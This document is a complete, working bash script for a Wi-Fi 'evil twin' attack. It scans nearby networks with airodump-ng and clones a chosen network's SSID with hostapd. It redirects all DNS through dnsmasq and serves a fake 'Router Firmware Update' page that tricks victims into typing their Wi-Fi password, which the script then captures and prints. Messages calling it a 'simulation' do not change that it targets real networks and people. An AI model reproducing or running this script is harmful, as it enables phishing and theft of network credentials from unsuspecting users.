#!/bin/bash

# --- HARDWARE CONFIGURATION ---
INTERFACE="wlp0s20f3"
GATEWAY_IP="192.168.4.1"
SCAN_PREFIX="/tmp/air_scan"

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "[-] Error: This script must be run as root. Use: sudo $0"
  exit 1
fi

# Clean up any residual configuration files from previous runs
rm -f ${SCAN_PREFIX}* hostapd.conf dnsmasq.conf captive.html

# --- HTML CAPTIVE PORTAL GENERATOR ---
cat << 'EOF' > captive.html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; }
        input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Router Firmware Update</h2>
        <p>A critical router security update is installing. Please re-enter your Wi-Fi password to restore connectivity.</p>
        <form action="/submit" method="POST">
            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
            <button type="submit">Update Now</button>
        </form>
    </div>
</body>
</html>
EOF

# --- PYTHON CAPTIVE PORTAL WEB SERVER SCRIPT ---
cat << 'EOF' > web_server.py
import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer

GATEWAY_IP = "192.168.4.1"
PORT = 80

class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        with open("captive.html", "r") as f:
            html = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(html, "utf-8"))

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            print("\n" + "="*40)
            print(f"[!] SIMULATION CAPTURE: {post_data}")
            print("="*40 + "\n")
            sys.stdout.flush()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>Authentication successful. Reconnecting...</h2>")
        else:
            self.do_GET()

server = HTTPServer((GATEWAY_IP, PORT), CaptivePortalHandler)
server.serve_forever()
EOF

# --- INITIALIZATION BLOCK ---
echo "[*] Killing background network locks and freeing port paths..."
nmcli device set "$INTERFACE" managed no
systemctl stop systemd-resolved 2>/dev/null
systemctl stop dnsmasq 2>/dev/null
killall dnsmasq 2>/dev/null
fuser -k 53/udp 53/tcp 67/udp 80/tcp 2>/dev/null

# --- NETWORK SCAN PHASE ---
echo "[*] Configuring wireless card into Monitor Mode..."
airmon-ng check kill >/dev/null 2>&1
ip link set "$INTERFACE" down
iw "$INTERFACE" set type monitor
ip link set "$INTERFACE" up
sleep 3  # Hardware stabilization delay

echo ""
echo "=========================================================="
echo " INSTRUCTIONS FOR TARGET CAPTURE POPUP:"
echo " 1. Wait for the popup window to list surrounding signals."
echo " 2. Click into the popup window and press CTRL+C to stop it."
echo "=========================================================="
echo ""
sleep 2

# Launch the airodump scan in a dedicated xterm window
xterm -geometry 110x25 -title "Live Wireless Scan - Press Ctrl+C when ready" -e "airodump-ng --write $SCAN_PREFIX --output-format csv $INTERFACE"

# Check if the scan output file exists
CSV_FILE="${SCAN_PREFIX}-01.csv"
if [ ! -f "$CSV_FILE" ]; then
    echo "[-] Error: Scan data file not found. Restarting..."
    exit 1
fi

# Parse the network list and present an interactive text menu
echo ""
echo "------------------- WIRELESS NETWORKS DETECTED -------------------"
awk -F, '
    BEGIN { count=0 }
    /BSSID/ { next }
    /Station/ { exit }
    {
        bssid=$1; ssid=$14; chan=$4;
        gsub(/^[ \t]+|[ \t]+$/, "", ssid);
        gsub(/^[ \t]+|[ \t]+$/, "", bssid);
        gsub(/^[ \t]+|[ \t]+$/, "", chan);
        if (length(ssid) > 0 && length(bssid) == 17) {
            print "["count"] SSID: " sprintf("%-25s", ssid) " BSSID: " bssid "  Channel: " chan;
            networks[count, "ssid"] = ssid;
            networks[count, "chan"] = chan;
            count++;
        }
    }
' "$CSV_FILE"
echo "------------------------------------------------------------------"

if [ -z "$(head -n 5 $CSV_FILE)" ]; then
    echo "[-] Error: No access points discovered in the scan buffer."
    exit 1
fi

# Request target input from user
read -p "Select the network index number to clone: " SELECTION

# Extract the chosen network's information
TARGET_SSID=$(awk -F, -v sel="$SELECTION" '
    BEGIN { count=0 } /BSSID/ { next } /Station/ { exit }
    {
        ssid=$14; gsub(/^[ \t]+|[ \t]+$/, "", ssid);
        if (length($1) == 17 && length(ssid) > 0) {
            if (count == sel) { print ssid; exit }
            count++;
        }
    }
' "$CSV_FILE")

TARGET_CHAN=$(awk -F, -v sel="$SELECTION" '
    BEGIN { count=0 } /BSSID/ { next } /Station/ { exit }
    {
        chan=$4; gsub(/^[ \t]+|[ \t]+$/, "", chan);
        if (length($1) == 17 && length($14) > 0) {
            if (count == sel) { print chan; exit }
            count++;
        }
    }
' "$CSV_FILE")

if [ -z "$TARGET_SSID" ]; then
    echo "[-] Invalid index choice. Aborting simulation."
    exit 1
fi

# --- DEPLOYMENT PHASE ---
echo ""
echo "[*] Shifting wireless card into Access Point mode for: '$TARGET_SSID' on Channel $TARGET_CHAN..."
ip link set "$INTERFACE" down
iw "$INTERFACE" set type managed
ifconfig "$INTERFACE" up "$GATEWAY_IP" netmask 255.255.255.0
sleep 2

# Write hostapd dynamic configurations
cat << EOF > hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHAN
auth_algs=1
wmm_enabled=0
EOF

# Write dnsmasq dynamic configurations
cat << EOF > dnsmasq.conf
interface=$INTERFACE
dhcp-range=192.168.4.2,192.168.4.50,255.255.255.0,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
EOF

# --- LAUNCH CORE DEMONS ---
echo "[*] Triggering internal routing systems (dnsmasq)..."
dnsmasq -C dnsmasq.conf -d >/dev/null 2>&1 &
DNSMASQ_PID=$!

echo "[*] Activating Access Point transceiver (hostapd)..."
hostapd hostapd.conf >/dev/null 2>&1 &
HOSTAPD_PID=$!

sleep 2

# --- LAUNCH WEB SERVER ---
echo ""
echo "[+] Evil Twin Simulation Active! Cloned Network Name: '$TARGET_SSID'"
echo "[*] Server Listening on Port 80. Connect your target device to proceed."
echo "[*] Press [CTRL+C] at any time to close the trap and restore internet links."
echo ""

# Handle cleanup automatically on termination
trap '
    echo ""
    echo "[-] Terminating simulation processes and fixing interface blocks..."
    kill $DNSMASQ_PID $HOSTAPD_PID 2>/dev/null
    killall python3 2>/dev/null
    ip link set "$INTERFACE" down
    iw "$INTERFACE" set type managed
    ip link set "$INTERFACE" up
    nmcli device set "$INTERFACE" managed yes
    systemctl start systemd-resolved 2>/dev/null
    rm -f hostapd.conf dnsmasq.conf captive.html web_server.py ${SCAN_PREFIX}*
    echo "[+] Done. System defaults restored."
    exit 0
' SIGINT

# Spin up the Python web engine directly in the current terminal to print logs live
python3 web_server.py
